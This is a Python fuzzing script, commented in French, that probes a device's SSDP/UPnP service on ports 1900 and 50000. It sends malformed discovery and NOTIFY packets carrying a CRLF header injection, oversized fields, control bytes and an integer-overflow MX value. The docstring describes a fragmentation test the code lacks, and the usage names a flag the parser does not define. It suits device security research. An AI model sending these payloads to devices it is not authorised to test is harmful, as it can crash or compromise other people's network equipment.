#!/usr/bin/env python3
"""upnp_ssdp_fuzz.py — Fuzz SSDP/UPnP du device Echo (ports 1900/50000).

SSDP = Simple Service Discovery Protocol (HTTP-over-UDP multicast).
Le device Echo utilise SSDP/UPnP pour la découverte (M-SEARCH confirmé
dans le binaire). C'est le protocole le plus laxiste de la liste.

Cibles :
- UDP 1900 (SSDP multicast standard)
- UDP 50000 (port SSDP alternatif ouvert par le firewall)
- TCP 50000 (peut-être le point d'entrée UPnP IGD)

Tests :
1. ctrl_ok : M-SEARCH standard → le device répond-il ?
2. HOST mensonger : host avec injection CRLF/URL
3. ST (Search Target) malformé : très long, avec des caractères de contrôle
4. MX absurdement grand (overflow entier)
5. MAN non-quoté (parsing laxiste)
6. URL trop longue dans LOCATION
7. Réponse SSDP avec XML malformé (si le device parse les réponses d'autres devices)
8. Fragmentation UDP (fragments IP qui se chevauchent vers le port SSDP)

Usage (nécessite device en mode ENREGISTRÉ) :
  python3 upnp_ssdp_fuzz.py --ip <device_ip> --probe   # d'abord : est-ce que SSDP répond ?
  python3 upnp_ssdp_fuzz.py --ip <device_ip> --case all --seq
"""
import argparse
import socket
import struct
import time

LOGF = "/tmp/upnp_ssdp_fuzz.log"
SSDP_ADDR = "239.255.255.250"
SSDP_PORT = 1900


def log(m):
    line = "%s %s" % (time.strftime("%H:%M:%S"), m)
    with open(LOGF, "a") as f:
        f.write(line + "\n")
    print(line, flush=True)


def ssdp_send(ip, port, message, timeout=3, use_multicast=False):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(timeout)
    try:
        if use_multicast:
            s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
            s.sendto(message.encode(), (SSDP_ADDR, SSDP_PORT))
        else:
            s.sendto(message.encode(), (ip, port))
        try:
            data, addr = s.recvfrom(4096)
            return data, addr
        except socket.timeout:
            return None, None
    finally:
        s.close()


def build_msearch(st="upnp:rootdevice", mx=3, host="239.255.255.250:1900"):
    return (f"M-SEARCH * HTTP/1.1\r\n"
            f"HOST: {host}\r\n"
            f"MAN: \"ssdp:discover\"\r\n"
            f"MX: {mx}\r\n"
            f"ST: {st}\r\n"
            f"\r\n")


# ------------------------------------------------------------------- CAS
def case_ctrl(ip):
    r = ssdp_send(ip, SSDP_PORT, build_msearch())
    return r


def case_ctrl_50000(ip):
    r = ssdp_send(ip, 50000, build_msearch())
    return r


def case_host_crlf(ip):
    msg = build_msearch(host="239.255.255.250:1900\r\nX-Inject: pwned\r\n")
    return ssdp_send(ip, SSDP_PORT, msg)


def case_st_overflow(ip):
    st = "upnp:rootdevice:" + "A" * 4096
    msg = build_msearch(st=st)
    return ssdp_send(ip, SSDP_PORT, msg)


def case_st_ctrl(ip):
    st = "upnp:rootdevice\x00\x01\x02\x03"
    msg = build_msearch(st=st)
    return ssdp_send(ip, SSDP_PORT, msg)


def case_mx_huge(ip):
    msg = build_msearch(mx=2147483647)
    return ssdp_send(ip, SSDP_PORT, msg)


def case_man_unquoted(ip):
    msg = (f"M-SEARCH * HTTP/1.1\r\n"
           f"HOST: 239.255.255.250:1900\r\n"
           f"MAN: ssdp:discover\r\n"  # ← sans quotes
           f"MX: 3\r\n"
           f"ST: upnp:rootdevice\r\n\r\n")
    return ssdp_send(ip, SSDP_PORT, msg)


def case_long_url(ip):
    """Si le device parse des NOTIFY (annonces d'autres devices),
    on lui envoie une LOCATION très longue."""
    url = "http://192.168.1.1:80/" + "A" * 2048 + "/desc.xml"
    msg = (f"NOTIFY * HTTP/1.1\r\n"
           f"HOST: 239.255.255.250:1900\r\n"
           f"NT: upnp:rootdevice\r\n"
           f"NTS: ssdp:alive\r\n"
           f"USN: uuid:12345678-1234-1234-1234-123456789012::upnp:rootdevice\r\n"
           f"LOCATION: {url}\r\n"
           f"CACHE-CONTROL: max-age=1800\r\n"
           f"SERVER: Pwn/1.0 UPnP/1.0\r\n\r\n")
    return ssdp_send(ip, SSDP_PORT, msg)


def case_multicast(ip):
    """Envoyer en multicast — le device écoute peut-être sur l'adresse multicast."""
    return ssdp_send(ip, SSDP_PORT, build_msearch(), use_multicast=True)


CASES = {
    "ctrl": ("M-SEARCH standard :1900", case_ctrl),
    "ctrl_50000": ("M-SEARCH standard :50000", case_ctrl_50000),
    "host_crlf": ("HOST avec injection CRLF", case_host_crlf),
    "st_overflow": ("ST overflow 4 Ko", case_st_overflow),
    "st_ctrl": ("ST avec bytes de contrôle", case_st_ctrl),
    "mx_huge": ("MX = 2^31-1", case_mx_huge),
    "man_unquoted": ("MAN sans quotes", case_man_unquoted),
    "long_url": ("NOTIFY avec LOCATION 2 Ko", case_long_url),
    "multicast": ("M-SEARCH via multicast", case_multicast),
}


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--ip", required=True)
    ap.add_argument("--case", default="probe")
    ap.add_argument("--seq", action="store_true")
    ap.add_argument("--list", action="store_true")
    a = ap.parse_args()
    if a.list:
        for n in CASES:
            print(f"  {n:20s} {CASES[n][0]}")
        return

    if a.case == "probe" or a.case == "all":
        log(f"=== PROBE SSDP : {a.ip} ===")
        for name in ["ctrl", "ctrl_50000", "multicast"]:
            r, addr = CASES[name][1](a.ip)
            if r:
                log(f"  ★ {name}: RÉPONSE de {addr} ({len(r)} o): {r[:80]}")
            else:
                log(f"  {name}: silence")
        if a.case == "probe":
            return

    for name, (desc, fn) in CASES.items():
        log(f"--- {desc} ---")
        r, addr = fn(a.ip)
        if r:
            log(f"  ★ RÉPONSE ({len(r)} o): {r[:120]}")
        else:
            log(f"  silence")
        time.sleep(0.5)
        if not a.seq:
            break


if __name__ == "__main__":
    main()
